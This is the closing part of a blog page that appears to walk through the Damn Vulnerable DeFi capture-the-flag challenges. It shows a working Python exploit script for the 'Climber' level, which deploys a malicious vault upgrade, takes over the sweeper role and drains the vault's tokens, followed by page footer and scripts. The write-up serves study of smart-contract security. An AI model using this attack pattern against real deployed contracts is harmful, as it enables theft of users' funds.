class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    climber_vault = Contract.from_abi(</span><br><span class="line">        <span class="string">&quot;Climber&quot;</span>, climber_vault_proxy, ClimberVault.abi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> climber_vault.getSweeper() == SWEEPER_ACCOUNT</span><br><span class="line">    <span class="keyword">assert</span> climber_vault.getLastWithdrawalTimestamp() &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> climber_vault.owner() != ZERO_ADDRESS</span><br><span class="line">    <span class="keyword">assert</span> climber_vault.owner() != accounts[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    time_lock_address = climber_vault.owner()</span><br><span class="line">    time_lock = ClimberTimelock.at(time_lock_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> time_lock.hasRole(time_lock.PROPOSER_ROLE(),</span><br><span class="line">                             PROPOSER_ACCOUNT) == <span class="literal">True</span></span><br><span class="line">    <span class="keyword">assert</span> time_lock.hasRole(time_lock.ADMIN_ROLE(), accounts[<span class="number">0</span>]) == <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    damn_valuable_token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="comment"># damn_valuable_token.initialize(</span></span><br><span class="line">    <span class="comment"># &quot;DamnValuableToken&quot;, &quot;DVT&quot;, 10 * VAULT_TOKEN_BALANCE)</span></span><br><span class="line">    damn_valuable_token.transfer(climber_vault, VAULT_TOKEN_BALANCE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> time_lock, climber_vault, ATTACKER_ACCOUNT, damn_valuable_token</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://docs.openzeppelin.com/contracts/3.x/access-control</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">vault, vault_time_lock, attacker_account, dvt</span>):</span><br><span class="line">    malicious_climber_vault = MaliciousClimberVault.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: attacker_account&#125;)</span><br><span class="line">    attacker_contract = climber_Exploit.deploy(</span><br><span class="line">        vault_time_lock, vault, malicious_climber_vault, &#123;<span class="string">&#x27;from&#x27;</span>: attacker_account&#125;)</span><br><span class="line">    tx = attacker_contract.attack(&#123;<span class="string">&#x27;from&#x27;</span>: attacker_account&#125;)</span><br><span class="line">    n = Contract.from_abi(<span class="string">&quot;maliciousVault&quot;</span>, vault, MaliciousClimberVault.abi)</span><br><span class="line">    n._setSweeper(attacker_account, &#123;<span class="string">&#x27;from&#x27;</span>: attacker_account&#125;)</span><br><span class="line">    vault.sweepFunds(dvt, &#123;<span class="string">&#x27;from&#x27;</span>: attacker_account&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">token, vault, attacker</span>):</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(vault) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker) == VAULT_TOKEN_BALANCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    time_lock, climber_vault, ATTACKER_ACCOUNT, damn_valuable_token = scenario_setup()</span><br><span class="line"></span><br><span class="line">    exploit(climber_vault, time_lock, ATTACKER_ACCOUNT, damn_valuable_token)</span><br><span class="line"></span><br><span class="line">    after(damn_valuable_token, climber_vault, ATTACKER_ACCOUNT)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/images/resume.pdf">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Contracts"><span class="toc-number">1.</span> <span class="toc-text">Common Contracts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DamnValuableToken-sol"><span class="toc-number">1.1.</span> <span class="toc-text">DamnValuableToken.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DamnValuableTokenSnapshot-sol"><span class="toc-number">1.2.</span> <span class="toc-text">DamnValuableTokenSnapshot.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DamnValuableNFT-sol"><span class="toc-number">1.3.</span> <span class="toc-text">DamnValuableNFT.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WETH9-sol"><span class="toc-number">1.4.</span> <span class="toc-text">WETH9.sol</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unstoppable"><span class="toc-number">2.</span> <span class="toc-text">Unstoppable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UnstoppableLender-sol"><span class="toc-number">2.1.</span> <span class="toc-text">UnstoppableLender.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReceiverUnstoppable-sol"><span class="toc-number">2.2.</span> <span class="toc-text">ReceiverUnstoppable.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unstoppable-py"><span class="toc-number">2.3.</span> <span class="toc-text">Unstoppable.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Naive-receiver"><span class="toc-number">3.</span> <span class="toc-text">Naive receiver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NaiveReceiverLenderPool-sol"><span class="toc-number">3.1.</span> <span class="toc-text">NaiveReceiverLenderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashLoanReceiver-sol"><span class="toc-number">3.2.</span> <span class="toc-text">FlashLoanReceiver.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naivereciever-exploit-sol"><span class="toc-number">3.3.</span> <span class="toc-text">naivereciever_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naivereciever-py"><span class="toc-number">3.4.</span> <span class="toc-text">naivereciever.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truster"><span class="toc-number">4.</span> <span class="toc-text">Truster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TrusterLenderPool-sol"><span class="toc-number">4.1.</span> <span class="toc-text">TrusterLenderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#truster-exploit-sol"><span class="toc-number">4.2.</span> <span class="toc-text">truster_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#truster-py"><span class="toc-number">4.3.</span> <span class="toc-text">truster.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Side-entrance"><span class="toc-number">5.</span> <span class="toc-text">Side entrance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SideEntranceLenderPool-sol"><span class="toc-number">5.1.</span> <span class="toc-text">SideEntranceLenderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashLoanEtherReceiver-sol"><span class="toc-number">5.2.</span> <span class="toc-text">FlashLoanEtherReceiver.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#side-entrance-py"><span class="toc-number">5.3.</span> <span class="toc-text">side-entrance.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-rewarder"><span class="toc-number">6.</span> <span class="toc-text">The rewarder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AccountingToken-sol"><span class="toc-number">6.1.</span> <span class="toc-text">AccountingToken.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashLoanerPool-sol"><span class="toc-number">6.2.</span> <span class="toc-text">FlashLoanerPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RewardToken-sol"><span class="toc-number">6.3.</span> <span class="toc-text">RewardToken.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TheRewarderPool-sol"><span class="toc-number">6.4.</span> <span class="toc-text">TheRewarderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-rewarder-exploit-sol"><span class="toc-number">6.5.</span> <span class="toc-text">the_rewarder_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-rewarder-py"><span class="toc-number">6.6.</span> <span class="toc-text">the-rewarder.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Selfie"><span class="toc-number">7.</span> <span class="toc-text">Selfie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SelfiePool-sol"><span class="toc-number">7.1.</span> <span class="toc-text">SelfiePool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleGovernance-sol"><span class="toc-number">7.2.</span> <span class="toc-text">SimpleGovernance.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#selfie-exploit-sol"><span class="toc-number">7.3.</span> <span class="toc-text">selfie_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#selfie-py"><span class="toc-number">7.4.</span> <span class="toc-text">selfie.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compromised"><span class="toc-number">8.</span> <span class="toc-text">Compromised</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TrustfulOracleInitializer-sol"><span class="toc-number">8.1.</span> <span class="toc-text">TrustfulOracleInitializer.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TrustfulOracle-sol"><span class="toc-number">8.2.</span> <span class="toc-text">TrustfulOracle.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exchange-sol"><span class="toc-number">8.3.</span> <span class="toc-text">Exchange.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compromised-py"><span class="toc-number">8.4.</span> <span class="toc-text">compromised.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppet"><span class="toc-number">9.</span> <span class="toc-text">Puppet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PuppetPool-sol"><span class="toc-number">9.1.</span> <span class="toc-text">PuppetPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Puppet-py"><span class="toc-number">9.2.</span> <span class="toc-text">Puppet.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppet-v2"><span class="toc-number">10.</span> <span class="toc-text">Puppet v2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PuppetV2Pool-sol"><span class="toc-number">10.1.</span> <span class="toc-text">PuppetV2Pool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#puppet-v2-py"><span class="toc-number">10.2.</span> <span class="toc-text">puppet-v2.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Free-rider"><span class="toc-number">11.</span> <span class="toc-text">Free rider</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeRiderBuyer-sol"><span class="toc-number">11.1.</span> <span class="toc-text">FreeRiderBuyer.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeRiderNFTMarketplace-sol"><span class="toc-number">11.2.</span> <span class="toc-text">FreeRiderNFTMarketplace.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freerider-exploit-sol"><span class="toc-number">11.3.</span> <span class="toc-text">freerider_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freerider-py"><span class="toc-number">11.4.</span> <span class="toc-text">freerider.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backdoor"><span class="toc-number">12.</span> <span class="toc-text">Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WalletRegistry-sol"><span class="toc-number">12.1.</span> <span class="toc-text">WalletRegistry.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#backdoor-exploit-sol"><span class="toc-number">12.2.</span> <span class="toc-text">backdoor_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#backdoor-py"><span class="toc-number">12.3.</span> <span class="toc-text">backdoor.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Climber"><span class="toc-number">13.</span> <span class="toc-text">Climber</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClimberTimelock-sol"><span class="toc-number">13.1.</span> <span class="toc-text">ClimberTimelock.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClimberVault-sol"><span class="toc-number">13.2.</span> <span class="toc-text">ClimberVault.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#climber-Exploit-sol"><span class="toc-number">13.3.</span> <span class="toc-text">climber_Exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MaliciousClimberVault-sol"><span class="toc-number">13.4.</span> <span class="toc-text">MaliciousClimberVault.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#climber-py"><span class="toc-number">13.5.</span> <span class="toc-text">climber.py</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&text=Damn Vulnerable Defi CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&is_video=false&description=Damn Vulnerable Defi CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Damn Vulnerable Defi CTF&body=Check out this article: http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&name=Damn Vulnerable Defi CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&t=Damn Vulnerable Defi CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2023
    Chandu Kona
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/images/resume.pdf">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4V3049N925"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-4V3049N925');
    </script>

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
